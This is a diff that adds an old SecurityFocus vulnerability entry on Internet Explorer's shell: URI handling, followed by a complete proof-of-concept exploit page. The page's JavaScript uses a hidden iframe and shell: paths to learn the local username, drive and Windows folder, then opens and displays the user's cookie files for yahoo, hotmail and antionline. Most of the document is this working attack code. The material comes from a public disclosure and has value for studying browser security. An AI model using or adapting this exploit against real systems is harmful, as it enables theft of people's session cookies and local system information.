@@ -1,0 +1,95 @@
+source: http://www.securityfocus.com/bid/9628/info
+ 
+It has been alleged that Microsoft Internet Explorer is prone to a weakness that may potentially allow for the execution of hostile script code in the context of the My Computer Zone. This issue is related to how shell: URIs are handled by the browser. It should also be noted that shell: URIs may be used to reference local content in the same manner as file:// URIs.
+ 
+Update: Although unconfirmed, further reports indicate that MSN messenger version 6.2.0137, Microsoft Word, Outlook 2003, and Outlook Express may also potentially provide exploitation vectors for this vulnerability.
+ 
+<html>
+<head>
+</head>
+<body onload=setTimeout("exploit()",4*100);>
+<iframe id="Target" width="0" height="0"
+src="shell:profile\Desktop.ini" name="Target" scrolling="yes">
+</iframe>
+<SCRIPT language=JavaScript>
+function exploit(){
+loc=new String(Target.location);
+var len=loc.length
+var n=loc.indexOf("Settings")+9;
+var m=loc.indexOf("System32");
+preuser=new String(loc.substring(n,len));
+p=preuser.indexOf("\\");
+user=new String(preuser.substring(0,p));
+winloc=new String(loc.substring(6,m));
+q=winloc.indexOf("\\");
+rootdrive=new String(winloc.substring(0,q+1));
+targetwin=window.open("");
+targetwin.document.write("<b>Username :</b> "+user+"<br>");
+targetwin.document.write("<b>root drive :</b> "+rootdrive+"<br>")
+targetwin.document.write("<b>location of windows folder :</b>
+"+winloc+"<br>")
+targetwin.document.write("<b>location of user profile
+:</b>"+rootdrive+"Documents and Settings\\"+user+"\\");
+targetwin.document.write("<br><br><b>Wallpaper :</b><br><br><img
+border=0 src='"+rootdrive+"Documents and Settings\\"+user+"\\Local
+Settings\\Application Data\\Microsoft\\Wallpaper1.bmp' width=30%
+height=30%>")
+targetwin.document.write("<br><br><b>internet explorer wallpaper
+:</b><br><br><img border=0 src='"+rootdrive+"Documents and
+Settings\\"+user+"\\Application Data\\Microsoft\\Internet
+Explorer\\Internet Explorer Wallpaper.bmp' width=30%
+height=30%><br><br>")
+
+var k=0;
+Targeturln=new Array("");
+Targeturl=new Array("");
+Targeturln[0]="yahoo"
+Targeturln[1]="hotmail"
+Targeturln[2]="antionline"
+do{
+Targeturl=Targeturln[k];
+contentx=new Array(x(Targeturl));
+if(contentx!="") {
+targetwin.document.write("<br><br><b><font size=5>Contents of the
+cookie file(s) related to
+"+Targeturl+"</font></b><br><br><br><font>"+contentx+"</font><br><br>");
+}
+if(contentx==""){
+targetwin.document.write("<b><br><br><font size=5>No files found
+related to "+Targeturl+"</font></b><br><br>");
+}
+k++;
+}while(k<3);
+return false;
+}
+
+
+function x(url){
+content=new Array("");
+var i=0;
+do{
+cookie=window.open("shell:profile\\Local
+Settings\\Temp\\cookies\\"+user+"@"+url+"["+i+"].txt");
+if (cookie.document.body.innerText!="")
+content=content+"<br>"+user+"@"+url+"["+i+"].txt
+:"+"<br><br>"+cookie.document.body.innerText;
+cookie.close();
+i++;
+}while(i<=3);
+i=0;
+do{
+cookie=window.open("shell:profile\\Local
+Settings\\Temp\\cookies\\"+user+"@www"+url+"["+i+"].txt");
+if (cookie.document.body.innerText!="")
+content=content+"<br>"+user+"@www."+url+"["+i+"].txt
+:"+"<br><br>"+cookie.document.body.innerText;
+cookie.close();
+i++;
+}while(i<=3);
+return content;
+}
+
+
+</SCRIPT>
+</body>
+</html>
